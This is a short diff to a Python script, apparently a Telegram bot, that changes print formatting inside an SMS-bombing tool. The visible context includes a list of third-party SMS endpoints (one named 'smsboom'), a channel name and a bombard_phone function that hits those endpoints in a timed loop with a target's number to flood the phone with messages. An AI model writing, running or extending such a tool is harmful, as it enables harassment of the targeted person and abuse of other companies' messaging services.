@@ -45,7 +45,6 @@ urls = [
     f"https://www.xinmeinet.cn/api/user/getMsg?status=1&touch={idcard}",
     f"http://n103.top:84/smsboom/?hm={idcard}",
 ]
-
 # 定义频道的用户名（没有 @ 符号）
 CHANNEL_USERNAME = 'pubgtianshenkar'
 
@@ -112,9 +111,9 @@ def bombard_phone(idcard, duration_minutes):
                 if response.status_code == 200:
                     print("请求成功: {}".format(full_url))
                 else:
-                    print("请求失败: {} - 状态码: {}".format(full_url, response.status_code))
+                    print("请求失败: {} • 状态码: {}".format(full_url, response.status_code))
             except Exception as e:
-                print("请求错误: {} - 错误信息: {}".format(url, e))
+                print("请求错误: {} • 错误信息: {}".format(url, e))
         time.sleep(10)
 
 def dxhz(update, context):
